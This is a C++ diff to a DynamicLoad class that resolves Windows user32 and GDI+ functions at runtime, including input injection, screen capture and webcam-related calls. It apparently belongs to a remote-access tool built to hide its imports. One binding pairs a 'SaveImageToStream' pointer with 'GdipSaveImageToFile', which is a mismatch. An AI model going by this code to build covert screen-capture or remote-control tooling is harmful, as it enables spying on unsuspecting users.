@@ -52,6 +52,7 @@ DynamicLoad::DynamicLoad() {
 
     }
 
+    this->LoadFMProcs();
 }
 
 //Bromas
@@ -91,19 +92,10 @@ void DynamicLoad::LoadRDProcs() {
     LOAD_DLL(this->hGdiPlusDLL, "gdiplus.dll");
     LOAD_DLL(this->hOle32, "ole32.dll");
 
-    /*if (!this->hGdi32DLL) {
-       this->hGdi32DLL = wrapLoadDLL("gdi32.dll");
-    }
-    if (!this->hGdiPlusDLL) {
-        this->hGdiPlusDLL = wrapLoadDLL("gdiplus.dll");
-    }
-    if (!this->hOle32) {
-        this->hOle32 = wrapLoadDLL("ole32.dll");
-    }*/
-
     if (this->hUser32DLL) {
         this->USER32_RD.pSendInput = (st_User32_RD::LPSENDINPUT)wrapGetProcAddr(this->hUser32DLL, "SendInput");
         this->USER32_RD.pGetDC = (st_User32_RD::LPGETDC)wrapGetProcAddr(this->hUser32DLL, "GetDC");
+        this->USER32_RD.pReleaseDC = (st_User32_RD::LPRELEASEDC)wrapGetProcAddr(this->hUser32DLL, "ReleaseDC");
         this->USER32_RD.pGetDesktopWindow = (st_User32_RD::LPGETDESKTOPWINDOW)wrapGetProcAddr(this->hUser32DLL, "GetDesktopWindow");
         this->USER32_RD.pEnumDisplayMonitors = (st_User32_RD::LPENUMDISPLAYMONITORS)wrapGetProcAddr(this->hUser32DLL, "EnumDisplayMonitors");
         this->USER32_RD.pGetMonitorInfoA = (st_User32_RD::LPGETMONITORINFOA)wrapGetProcAddr(this->hUser32DLL, "GetMonitorInfoA");
@@ -135,6 +127,11 @@ void DynamicLoad::LoadRDProcs() {
         this->GDIPLUS_RD.pGdipGetImageHeight = (st_GdiPlus::LPGDIPGETIMAGEHEIGHT)wrapGetProcAddr(this->hGdiPlusDLL, "GdipGetImageHeight");
         this->GDIPLUS_RD.pGdipGetImagePixelFormat = (st_GdiPlus::LPGDIPGETIMAGEPIXELFORMAT)wrapGetProcAddr(this->hGdiPlusDLL, "GdipGetImagePixelFormat");
         this->GDIPLUS_RD.pGdipCloneBitmapAreaI = (st_GdiPlus::LPGDIPCLONEBITMAPAREAI)wrapGetProcAddr(this->hGdiPlusDLL, "GdipCloneBitmapAreaI");
+        this->GDIPLUS_RD.pGdipCreateBitmapFromHBITMAP = (st_GdiPlus::LPGDIPCREATEBITMAPFROMHBITMAP)wrapGetProcAddr(this->hGdiPlusDLL, "GdipCreateBitmapFromHBITMAP");
+        this->GDIPLUS_RD.pGdipCreateBitmapFromScan0 = (st_GdiPlus::LPGDIPCREATEBITMAPFROMSCAN0)wrapGetProcAddr(this->hGdiPlusDLL, "GdipCreateBitmapFromScan0");
+        this->GDIPLUS_RD.pGetImageEncodersSize = (st_GdiPlus::LPGETIMAGEENCODERSSIZE)wrapGetProcAddr(this->hGdiPlusDLL, "GdipGetImageEncodersSize");
+        this->GDIPLUS_RD.pGetImageEncoders = (st_GdiPlus::LPGETIMAGEENCODERS)wrapGetProcAddr(this->hGdiPlusDLL, "GdipGetImageEncoders"); //flat Api
+        this->GDIPLUS_RD.pGdipSaveImageToStream = (st_GdiPlus::LPGDIPSAVEIMAGETOSTREAM)wrapGetProcAddr(this->hGdiPlusDLL, "GdipSaveImageToFile");
     }
 }
 
@@ -247,8 +244,10 @@ void DynamicLoad::LoadCamProcs() {
     if (this->hGdiPlusDLL) {
         this->GDIPLUS_RD.pGdiplusStartup = (st_GdiPlus::LPGDIPLUSSTARTUP)wrapGetProcAddr(this->hGdiPlusDLL, "GdiplusStartup");
         this->GDIPLUS_RD.pGdiplusShutdown = (st_GdiPlus::LPGDIPLUSSHUTDOWN)wrapGetProcAddr(this->hGdiPlusDLL, "GdiplusShutdown");
-        this->GDIPLUS_RD.pGetImageEncodersSize = (st_GdiPlus::LPGETIMAGEENCODERSSIZE)wrapGetProcAddr(this->hGdiPlusDLL, "GetImageEncodersSize");
-        this->GDIPLUS_RD.pGetImageEncoders = (st_GdiPlus::LPGETIMAGEENCODERS)wrapGetProcAddr(this->hGdiPlusDLL, "GetImageEncoders");
+        //this->GDIPLUS_RD.pGetImageEncodersSize = (st_GdiPlus::LPGETIMAGEENCODERSSIZE)wrapGetProcAddr(this->hGdiPlusDLL, "GetImageEncodersSize");  Gdiplus wrapper
+        this->GDIPLUS_RD.pGetImageEncodersSize = (st_GdiPlus::LPGETIMAGEENCODERSSIZE)wrapGetProcAddr(this->hGdiPlusDLL, "GdipGetImageEncodersSize");  // Flat api
+        //this->GDIPLUS_RD.pGetImageEncoders = (st_GdiPlus::LPGETIMAGEENCODERS)wrapGetProcAddr(this->hGdiPlusDLL, "GetImageEncoders");
+        this->GDIPLUS_RD.pGetImageEncoders = (st_GdiPlus::LPGETIMAGEENCODERS)wrapGetProcAddr(this->hGdiPlusDLL, "GdipGetImageEncoders"); //flat Api
         this->GDIPLUS_RD.pFromStream = (st_GdiPlus::LPFROMSTREAM)wrapGetProcAddr(this->hGdiPlusDLL, "FromStream");
 		this->GDIPLUS_RD.pGdipSaveImageToStream = (st_GdiPlus::LPGDIPSAVEIMAGETOSTREAM)wrapGetProcAddr(this->hGdiPlusDLL, "GdipSaveImageToFile");
     }
